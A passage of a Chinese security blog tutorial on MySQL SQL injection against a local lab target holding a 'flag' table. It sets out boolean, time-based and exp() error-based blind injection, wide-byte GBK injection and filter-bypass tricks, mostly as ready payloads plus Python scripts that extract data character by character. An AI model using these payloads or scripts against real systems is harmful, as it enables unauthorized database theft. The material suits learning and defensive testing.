<p><strong>猜表名内容</strong><br>payload：<code>id=1 and if((select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema=&#39;web&#39; limit 0,1)=1,1,0)</code><br>通过修改第二个比较值来获得字符的ascii码；通过修改substr的参数2来实现其他几个字符的爆破<br>payload构造过程：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">id=1 and if(x=1,1,0)			//构造框架</span><br><span class="line"></span><br><span class="line">select table_name from information_schema.tables where table_schema=&#x27;web&#x27;			//构造x</span><br><span class="line"></span><br><span class="line">id=1 and if(select table_name from information_schema.tables where table_schema=&#x27;web&#x27;=1,1,0)		//替换x</span><br><span class="line"></span><br><span class="line">ascii(table_name)			//构造ascii函数</span><br><span class="line"></span><br><span class="line">substr(table_name,1,1)		//构造substr函数</span><br><span class="line"></span><br><span class="line">ascii(substr(table_name,1,1))		//合并替换</span><br><span class="line"></span><br><span class="line">id=1 and if(select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema=&#x27;web&#x27; limit 0,1=1,1,0)</span><br><span class="line">//合并替换加入limit</span><br><span class="line"></span><br><span class="line">id=1 and if((select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema=&#x27;web&#x27; limit 0,1)=1,1,0)</span><br><span class="line">//整个select语句是第一个比较值，所以用()括起来</span><br></pre></td></tr></table></figure>

<h4 id="2-3-猜列名"><a href="#2-3-猜列名" class="headerlink" title="2.3 猜列名"></a>2.3 猜列名</h4><p><strong>列名长度</strong><br>payload：<code>id=1 and if((select length(column_name) from information_schema.columns where table_schema=&#39;web&#39; and table_name=&#39;user&#39; limit 0,1)=1,1,0)</code><br>使用猜表名长度的payload修改列名和表名即可得到猜列名长度的payload。当修改了limit参数后if比较值2递增到100以上，猜测没有这个列，由此可得该表有多少列。<br><strong>列名名称</strong><br>payload：<code>id=1 and if((select ascii(substr(column_name,1,1)) from information_schema.columns where table_schema=&#39;web&#39; and table_name=&#39;user&#39; limit 0,1)=1,1,0)</code><br>和猜表名名称大同小异，需要注意的是一个表中会存在多个列名，通过修改limit的参数1来控制猜第几个。通过循环猜列名长度和列名名称来爆出所有列。</p>
<h4 id="2-4-读取flag"><a href="#2-4-读取flag" class="headerlink" title="2.4 读取flag"></a>2.4 读取flag</h4><p><strong>猜长度</strong><br>payload：<code>id=1 and if((select length(flag) from flag)=1,1,0)</code></p>
<p><strong>猜值</strong><br>payload：<code>id=1 and if((select ascii(substr(flag,1,1)) from flag)=1,1,0)</code><br>修改对应的参数来获取对于的值</p>
<h3 id="3-延时盲注"><a href="#3-延时盲注" class="headerlink" title="3. 延时盲注"></a>3. 延时盲注</h3><p>当返回无回显，并且只有一种返回结果时，这种情况需要延时盲注；根据服务端响应的时间，来猜测数据；相对来说效率较低，因为需要使用延时函数。<br>延时盲注和布尔盲注的paylaod区别就是把if为真返回的参数改为延时函数(if函数参数2)，来达到响应延时的效果。</p>
<h4 id="3-1-猜数据库"><a href="#3-1-猜数据库" class="headerlink" title="3.1 猜数据库"></a>3.1 猜数据库</h4><p>猜长度payload：<code>id=1 and (select if((length(database()))=3,sleep(2),0))</code><br>猜名称payload：<code>id=1 and (select if((ascii(substr(database(),1,1)))=119,sleep(2),0))</code><br>实现原理了布尔盲注一致，不在叭叭<del>\</del></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,time</span><br><span class="line">url = <span class="string">&quot;http://192.168.1.128/6/8/intsql.php&quot;</span></span><br><span class="line">f = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):<span class="comment">#数据库长度</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        payload = &#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;1 and if((ascii(substr((database()),&quot;</span>+<span class="built_in">str</span>(k+<span class="number">1</span>)+<span class="string">&quot;,1))=&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;),sleep(3),0)&quot;</span>&#125;</span><br><span class="line">        <span class="comment">#print (payload)</span></span><br><span class="line">        first = time.time()</span><br><span class="line">        r = requests.post(url,data=payload)</span><br><span class="line">        second = time.time()</span><br><span class="line">        offset = second-first</span><br><span class="line">        <span class="keyword">if</span> offset&gt;<span class="number">2</span>:</span><br><span class="line">            f += <span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="built_in">print</span> (f)</span><br></pre></td></tr></table></figure>
<h4 id="3-2-猜表名"><a href="#3-2-猜表名" class="headerlink" title="3.2 猜表名"></a>3.2 猜表名</h4><p>由于表存在多个，我们使用group_concat函数来查询，思路：表名称长度合集的长度==&gt;表长度合集内容==&gt;所有表名称长度合集==&gt;表名称<br>猜表名称长度合集的长度payload：<code>id=1 and (select if((select length(group_concat(length(table_name)))length from information_schema.tables where table_schema=&#39;web&#39;)=1,sleep(2),0))</code><br>比如表1是@n,长度x；表2是@m，长度y。所以他们的的长度合集是”x,y”，该paylaod爆出”x,y”的长度，接下来爆出”x,y”的值，当然这种方法表名长度超过10不适用。</p>
<p>表长度合集内容：<code>id=1 and (select if((select ascii(substr(group_concat(length(table_name)),1,1)) from information_schema.tables where table_schema=&#39;web&#39;)=1,sleep(2),0))</code><br>通过修改该payload爆出长度合集，格式”4,4”。这样就知道了有几个表。当然也可以直接爆名称，当32-127都没有匹配时，即可停止</p>
<p>所有表名称长度合集：<br>数据库中有两个表，两个表名称长度都为4。4+4+一个逗号，所以所有表名称长度为8+1，我们需要控制substr参数2从1到8来爆出表名。<strong>写完我才发现，我好像多走了一步，直接爆表名称合集长度，然后爆内容即可，写都写好就不改了，知道怎么用就行了。</strong></p>
<p>爆表名称：<code>id=1 and (select if((select ascii(substr(group_concat(table_name),1,1)) from information_schema.tables where table_schema=&#39;web&#39;)=102,sleep(2),0))</code><br>只需要把表长度合集内容的payload的length参数去掉即可。</p>
<h4 id="3-3-猜列名"><a href="#3-3-猜列名" class="headerlink" title="3.3 猜列名"></a>3.3 猜列名</h4><p>修改猜表名的列名和表名即可，不在赘述。</p>
<h4 id="3-4-拿flag"><a href="#3-4-拿flag" class="headerlink" title="3.4 拿flag"></a>3.4 拿flag</h4><p>和布尔型盲注大同小异，不在赘述。学会原理就可，没必要一定拿到flag。我之前就是这种杠精(哈哈哈)</p>
<h4 id="3-5-数据库名长度"><a href="#3-5-数据库名长度" class="headerlink" title="3.5 数据库名长度"></a>3.5 数据库名长度</h4><p>下面使用and短路特性，and运算只有两个表达式都为true结果才为true，程序是从前往后执行的，当前面的表达式返回flase时，and运行就不会继续向后运算。<br>payload：<code>select length(database())=3 and sleep(2);</code></p>
<p>当数据库名长度为3时，会执行sleep函数，造成延时。<br>当数据库名长度不为3时，程序会返回不执行sleep函数。<br>当if语句被过滤时，可以使用，但我感觉and方式更简单(小声bb)</p>
<h2 id="六、exp报错盲注"><a href="#六、exp报错盲注" class="headerlink" title="六、exp报错盲注"></a>六、exp报错盲注</h2><h3 id="1-整数范围"><a href="#1-整数范围" class="headerlink" title="1. 整数范围"></a>1. 整数范围</h3><p>mysql中存在多种整数类型，分别是：tinyint，smallint，mediumint，int，bigint。<br><img src="https://img.xpctf.cn/img/20200628084754.png" alt=""></p>
<p>在5.5版本之前，超过最大整数，数据库不会报错；5.5之后的版本才会报错。<br><img src="https://img.xpctf.cn/img/20200628085246.png" alt=""></p>
<h3 id="2-exp函数"><a href="#2-exp函数" class="headerlink" title="2.exp函数"></a>2.exp函数</h3><p>exp函数 返回e的X次方的值,多少次方由参数决定，当exp的参数大于709时，返回大于最大整数，导致报错。<br>用法：exp(5)    实例：selecp exp(5);    e = 2.71828183</p>
<h3 id="3-exp报错盲注"><a href="#3-exp报错盲注" class="headerlink" title="3. exp报错盲注"></a>3. exp报错盲注</h3><p>payload原型：<code>id=1 and exp(709+C-ascii(substr((select database()),1,1)));</code><br>分析：709是exp可计算最大的值，当exp参数大于709就会报错；通过控制C来爆出数据库名，当数据库名的ascii码小于C时就会报错<br>数学公式：709+C-ascii()=710<br>也知C，则ascii()=709+c-710<br>假设数据库报错时C为120，根据公式推算ascii()为119，119通过解码得到’w’，由此可得数据库第一个字母为’w’。上面只是为了搞清原理：ascii()=C-1<br>上述方法适用于C递增，也可以使用C递减；使用C递减时，当数据库不报错时，C的值等于ascii()值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">库名长度</span><br><span class="line">id=1 and exp(709+1-length((select database())));</span><br><span class="line"></span><br><span class="line">库名</span><br><span class="line">id=1 and exp(709+119-ascii(substr((select database()),1,1)));</span><br><span class="line"></span><br><span class="line">表名长度</span><br><span class="line">id=1 and exp(709+1-(select length(group_concat(table_name)) from information_schema.tables where table_schema=database()));</span><br><span class="line">//直接使用database()函数读取库名，省去爆库</span><br><span class="line"></span><br><span class="line">表名</span><br><span class="line">id=1 and exp(709+1-(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))));</span><br><span class="line"></span><br><span class="line">列名长度</span><br><span class="line">id=1 and exp(709+1-(select length(group_concat(column_name)) from information_schema.columns where table_name=&#x27;flag&#x27;));</span><br><span class="line"></span><br><span class="line">列名</span><br><span class="line">id=1 and exp(709+1-(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;),1,1))));</span><br><span class="line"></span><br><span class="line">数据长度</span><br><span class="line">id=1 and exp(709+1-(select length(group_concat(flag)) from flag));</span><br><span class="line"></span><br><span class="line">数据</span><br><span class="line">id=1 and exp(709+1-(ascii(substr((select group_concat(flag) from flag),1,1))));</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#库名</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.1.128/6/5/intsql.php&quot;</span></span><br><span class="line">f = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):<span class="comment">#长度</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        payload = &#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;1 and exp(709+&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;-ascii(substr((select database()),&quot;</span>+<span class="built_in">str</span>(k+<span class="number">1</span>)+<span class="string">&quot;,1)));&quot;</span>&#125;</span><br><span class="line">        <span class="comment">#print (payload)</span></span><br><span class="line">        r = requests.post(url,data=payload).text</span><br><span class="line">        <span class="keyword">if</span> r.find(<span class="string">&#x27;range&#x27;</span>)!=-<span class="number">1</span>:</span><br><span class="line">            f += <span class="built_in">chr</span>(i-<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span> (f)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#表名</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.1.128/6/5/intsql.php&quot;</span></span><br><span class="line">f = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):<span class="comment">#长度</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        payload = &#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;1 and exp(709+&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;-(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&quot;</span>+<span class="built_in">str</span>(k+<span class="number">1</span>)+<span class="string">&quot;,1))));&quot;</span>&#125;</span><br><span class="line">        <span class="comment">#print (payload)</span></span><br><span class="line">        r = requests.post(url,data=payload).text</span><br><span class="line">        <span class="keyword">if</span> r.find(<span class="string">&#x27;range&#x27;</span>)!=-<span class="number">1</span>:</span><br><span class="line">            f += <span class="built_in">chr</span>(i-<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span> (f)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#列名</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.1.128/6/5/intsql.php&quot;</span></span><br><span class="line">f = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):<span class="comment">#长度</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        payload = &#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;1 and exp(709+&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;-(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;),&quot;</span>+<span class="built_in">str</span>(k+<span class="number">1</span>)+<span class="string">&quot;,1))))&quot;</span>&#125;</span><br><span class="line">        <span class="comment">#print (payload)</span></span><br><span class="line">        r = requests.post(url,data=payload).text</span><br><span class="line">        <span class="keyword">if</span> r.find(<span class="string">&#x27;range&#x27;</span>)!=-<span class="number">1</span>:</span><br><span class="line">            f += <span class="built_in">chr</span>(i-<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span> (f)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#数据</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.1.128/6/5/intsql.php&quot;</span></span><br><span class="line">f = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>):<span class="comment">#长度</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        payload = &#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;1 and exp(709+&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;-(ascii(substr((select group_concat(flag) from flag),&quot;</span>+<span class="built_in">str</span>(k+<span class="number">1</span>)+<span class="string">&quot;,1))))&quot;</span>&#125;</span><br><span class="line">        <span class="comment">#print (payload)</span></span><br><span class="line">        r = requests.post(url,data=payload).text</span><br><span class="line">        <span class="keyword">if</span> r.find(<span class="string">&#x27;range&#x27;</span>)!=-<span class="number">1</span>:</span><br><span class="line">            f += <span class="built_in">chr</span>(i-<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span> (f)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="七、宽字节注入"><a href="#七、宽字节注入" class="headerlink" title="七、宽字节注入"></a>七、宽字节注入</h2><h3 id="1-字符编码"><a href="#1-字符编码" class="headerlink" title="1. 字符编码"></a>1. 字符编码</h3><h4 id="1-1-url编码"><a href="#1-1-url编码" class="headerlink" title="1.1 url编码"></a>1.1 url编码</h4><p>url编码 主要用于URL中，对字符进行编码。编码原理：字符的ASCII值得16进制，再在前面加上一个%，\是宽字节注入的重点，%5c</p>
<h4 id="1-2-GBK编码"><a href="#1-2-GBK编码" class="headerlink" title="1.2 GBK编码"></a>1.2 GBK编码</h4><p>GBK全称叫汉字内码扩展规范，GBK编码共收录21886个汉字和图像符号，其中汉字21003个，图形符号883个<br><strong>主要重点：</strong>GBK是一种多字符编码，编码一个汉字需要两个字节，并且汉字编码的第一个字节大于128</p>
<h5 id="1-3-utf8编码"><a href="#1-3-utf8编码" class="headerlink" title="1.3 utf8编码"></a>1.3 utf8编码</h5><p>unicode编码的出现：计算机在刚刚出现的时候，只有ASCII码，随着计算机的使用越来越广泛，就产生了许多新的编码方式，不如GB2312 BIG5 Shif_JIS 后来为了统一这些编码方式，出现了unicode编码。<br>unicode编码和utf8的关系：utf8编码是unicode编码的一种实现方式，根据不同的unicode字符，用1-6个字节来编码<br><strong>主要重点：</strong>utf8编码汉字，编码一个汉字使用三个字节</p>
<h3 id="2-宽字节注入"><a href="#2-宽字节注入" class="headerlink" title="2. 宽字节注入"></a>2. 宽字节注入</h3><p>宽字节注入主要用于字符型注入 单引号别转义的情况,常用的转义函数有addslashes() mysql_real_escape_string() mysql_escape_string() 作用是将单引号转义，来防止sql注入。<br>宽字节注入原理：利用MySQL在进行数据传输时，编码的不一致，导致了转义字符被吃掉，形成sql注入。<br>反斜杠\的16进制是5c，当我们在前面加上%df，组合成%df%5c,当MySQL使用了gbk编码，MySQL会认为df5c是一个汉字，这样就会把刚刚转义添加的反斜杠吃掉。<br>username=admin%df’ 转义username=admin&#39; GBK重编码 username=admin運’<br><strong>注意：</strong>第一个字节的范围要大于128，比如说%df，才能达到汉字的范围。</p>
<h4 id="2-1-测试回显"><a href="#2-1-测试回显" class="headerlink" title="2.1 测试回显"></a>2.1 测试回显</h4><p>与union联合注入相似，都是使用order by来才是列数，使用union测试回显位。<br>列数payload：<code>username=admin%df%27 order by 3%23&amp;password=admin</code><br>回显payload：<code>username=admin%df%27 union select 1,2,3%23&amp;password=admin</code></p>
<h4 id="2-2-爆库名"><a href="#2-2-爆库名" class="headerlink" title="2.2 爆库名"></a>2.2 爆库名</h4><p>这种有回显的注入都不需要猜长度，能直接回显，非常简单，可以跳过爆库名，直接使用database()<br>paylaod：<code>username=admin%df%27 union select 1,database(),3%23&amp;password=admin</code></p>
<h4 id="2-3-爆表名-1"><a href="#2-3-爆表名-1" class="headerlink" title="2.3 爆表名"></a>2.3 爆表名</h4><p>由于where也要使用引号来包含，下面直接使用database()函数，这也是最省事的方法。<br>paylaod：<code>username=admin%df%27 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23&amp;password=admin</code></p>
<h4 id="2-4-爆列名-1"><a href="#2-4-爆列名-1" class="headerlink" title="2.4 爆列名"></a>2.4 爆列名</h4><p>把表名使用16进制编码，即可绕过单引号，得加上0x表示该字符串是16进制。<br>paylaod：<code>username=admin%df%27 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x666c6167%23&amp;password=admin</code></p>
<h4 id="2-5-爆数据"><a href="#2-5-爆数据" class="headerlink" title="2.5 爆数据"></a>2.5 爆数据</h4><p>payload：<code>username=admin%df%27 union select 1,flag,3 from flag%23&amp;password=admin</code></p>
<h2 id="八、各种绕过"><a href="#八、各种绕过" class="headerlink" title="八、各种绕过"></a>八、各种绕过</h2><h3 id="1-空格过滤绕过"><a href="#1-空格过滤绕过" class="headerlink" title="1. 空格过滤绕过"></a>1. 空格过滤绕过</h3><p>该种情况主要是用于过滤空格使用</p>
<h4 id="1-1-换行符绕过"><a href="#1-1-换行符绕过" class="headerlink" title="1.1 换行符绕过"></a>1.1 换行符绕过</h4><p>换行符，可以起到一个换行得作用，比如：\n \d<br>常用的换行符经过url编码后：%0a %0b %0c %0d<br>为什么需要url编码：如果不进行url编码，程序会把\n当作一个字符，也就是说不能起到换行的作用，换行符需要url编码一下，经过php时，php会自动解码，就变成了一个换行符。<br>payload：<code>username=dir&#39;%0aunion%0aselect%0a1,2,3%23&amp;password=admin</code><br>把空格用换行符替换即可，小技巧：可以先打空格，然后搜索替换成换行符的url编码</p>
<h4 id="1-2-注释符绕过"><a href="#1-2-注释符绕过" class="headerlink" title="1.2 注释符绕过"></a>1.2 注释符绕过</h4><p>用注释符代替空格，把所有的空格替换换行符就行，但必须多行注释，因为需要闭合，如果单行注释拿后面的语句会被注释掉，多行注释：<code>/**/</code><br>payload：<code>username=dir&#39;/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=database()%23&amp;password=admin</code></p>
<h4 id="1-3-括号绕过"><a href="#1-3-括号绕过" class="headerlink" title="1.3 括号绕过"></a>1.3 括号绕过</h4><p>括号在MySQL是用来包围子查询的，任何可以计算出结果的语句，都可以用括号包裹；括号绕过和上面两个利用方法不同。<br>select()1;        错误<br>select(1);        正确<br>payload：<code>id=(1)and(if(((ascii(substr(database(),1,1)))=119),1,0))%23</code><br>因为union联合查询不能使用括号，所有只能使用布尔报错盲注。<br>加入select查询的pyaload：<code>id=(1)and(if(((ascii(substr((select(flag)from(flag)),1,1)))=1),1,0))%23</code></p>
<h3 id="2-逗号过滤绕过"><a href="#2-逗号过滤绕过" class="headerlink" title="2. 逗号过滤绕过"></a>2. 逗号过滤绕过</h3><p>sql注入中需要使用到逗号的三个地方：函数的参数分割使用逗号，limit使用逗号，union联合查询使用逗号，但后台对逗号进行了过滤，就得绕过过滤规则。<br>实例：substr(str,1,1) | limit 0,1 | union select 1,2,3</p>
<h4 id="2-1-from-for绕过"><a href="#2-1-from-for绕过" class="headerlink" title="2.1 from for绕过"></a>2.1 from for绕过</h4><p>from for 主要是用在函数内，用来截取第几个字符；from for主要是用于绕过substr的逗号,主要用于盲注。<br>用法：substr(database()form x for y) 从x开始截取y个字符，x相当于substr的参数2，y相当于substr的参数3。<br><img src="https://img.xpctf.cn/img/20200629161921.png" alt=""><br>payload：<code>id=1 and ascii(substr((select flag from flag)from 1 for 1))=102</code></p>
<h4 id="2-2-limit-offset绕过"><a href="#2-2-limit-offset绕过" class="headerlink" title="2.2 limit offset绕过"></a>2.2 limit offset绕过</h4><p>limit offset绕过使用场景：当过滤了group_concat和limit 0,1时，可以使用limit offset绕过。<br>用法：limit rouw_count offset offser；rou_count返回多少行，offset 偏移量，就是从第几行开始返回，从0开始。刚好和limit 0,1反过来。<br><img src="https://img.xpctf.cn/img/20200629173734.png" alt=""><br>payload原型：<code>id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=&#39;web&#39; limit 0,1),1,1))=102</code><br>payload绕过：<code>id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=&#39;web&#39; limit 1 offset 0)from 1 for 1))=102</code></p>
<h4 id="2-4-join绕过"><a href="#2-4-join绕过" class="headerlink" title="2.4 join绕过"></a>2.4 join绕过</h4><p>派生表：MySQL在进行子查询是，会产生一个派生表，他的sqlect语句产生一个虚拟表，也外部没有关系，产生的结果传给外部的select查询。<br>实例：select * from ((select 1)a,(select 2)b);<br>使用join连接派生表，在通过子查询来查询我们想要的结果。在回显位里面构造sql语句即可获取数据库中的所有数据。<br>payload：<code>dir&#39; union select * from ((select 1)a join (select database())b join (select 3)c)%23</code></p>
<h3 id="3-等于号绕过"><a href="#3-等于号绕过" class="headerlink" title="3. 等于号绕过"></a>3. 等于号绕过</h3><p>等号使用场景：=主要用于盲注中，用来判断数据的大小是否相等，所以我们可以从判断数据大小的角度入手，找到绕过方法。</p>
<h4 id="3-1-大小于号绕过"><a href="#3-1-大小于号绕过" class="headerlink" title="3.1 大小于号绕过"></a>3.1 大小于号绕过</h4><p><code>&gt;  &lt;</code>号是用来进行数据比较的，可以使用大小于号绕过。<br>第一种：<code>id=1 and ascii(substr((select database()),1,1))&gt;119%23</code><br>如果使用递增方式，当回显异常时数据正确；如果使用递减方式，当回显正常时数据+1正确<br>第二种：<code>id=1 and ascii(substr((select database()),1,1))&lt;119%23</code><br>如果使用递增方式，当回显正常时数据-1正确；如果使用递减方式，当回显异常时数据正确<br>第三种：<code>id=1 and ascii(substr((select database()),1,1))&lt;&gt;119%23</code><br>当两者不等时，返回正常；当两者相等时，返回异常。返回异常则数据正确<br>第四种：<code>id=1 and !(ascii(substr((select database()),1,1))&lt;&gt;119)%23</code><br>使用非运行达到相等的结果，虽然有点抽象，但理解后就是等号的效果</p>
<h4 id="3-2-strcmp函数绕过"><a href="#3-2-strcmp函数绕过" class="headerlink" title="3.2 strcmp函数绕过"></a>3.2 strcmp函数绕过</h4><p>strcmp函数 用来比较两个字符串或数字，如果相等返回0。还有-1和1的返回值，这里就用0<br>payload：<code>id=1 and strcmp((ascii(substr((select database()),1,1))),119)</code></p>
<h4 id="3-3-in函数"><a href="#3-3-in函数" class="headerlink" title="3.3 in函数"></a>3.3 in函数</h4><p>in函数 查询文字是否在字符串中存在，存在返回1，不存在返回0<br>paylaod：<code>id=1 and ascii(substr((select database()),1,1)) in (119)</code></p>
<h3 id="4-异或注入"><a href="#4-异或注入" class="headerlink" title="4. 异或注入"></a>4. 异或注入</h3><p>异或注入 主要用于检测关键字是否被过滤，在之前绕过waf的学习中，都是提示了某些关键字是否被过滤；如果不提示，该如何去判断关键字是否被过滤。<br>第一种：挨个试，把每个关键字都输入一遍，如果访问失败和关键字被过滤的返回结果一样，就无法判断关键字是否被过滤。<br>第二种：异或注入</p>
<h4 id="4-1-异或"><a href="#4-1-异或" class="headerlink" title="4.1 异或"></a>4.1 异或</h4><p>什么是异或：相同返回0，不同返回非0<br>用法：select 1^2;</p>
<h4 id="4-2-payload分析"><a href="#4-2-payload分析" class="headerlink" title="4.2 payload分析"></a>4.2 payload分析</h4><p>payload：<code>id=1 ^ (length(&#39;union&#39;)=5)</code><br>当union被过滤时，length(‘union’)的长度不等于5，返回0；1^0返回1，此时有输出<br>当union未过滤时，length(‘union’)的长度等于5，返回1；1^1返回0，此时无输出<br>结论：当关键词过过滤时，回显正常；当关键词未被过滤时，回显异常<br>期待结果：回显异常</p>
</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">XiaoPu</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.xpctf.cn/posts/c70/">https://www.xpctf.cn/posts/c70/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.xpctf.cn" target="_blank">一只小白</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></div><div class="post_share"><div class="social-share" data-image="https://img.xpctf.cn/img/202109021456764.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><div class="post-reward"><a class="reward-button button--primary button--animated"> <i class="fa fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><img class="post-qr-code__img" src="/img/wechat.jpg" alt="微信"/><div class="post-qr-code__desc">微信</div></li><li class="reward-item"><img class="post-qr-code__img" src="/img/alipay.jpg" alt="支付宝"/><div class="post-qr-code__desc">支付宝</div></li></ul></div></a></div><nav class="pagination_post" id="pagination"><div class="prev-post pull_left"><a href="/posts/d106/"><img class="prev_cover" 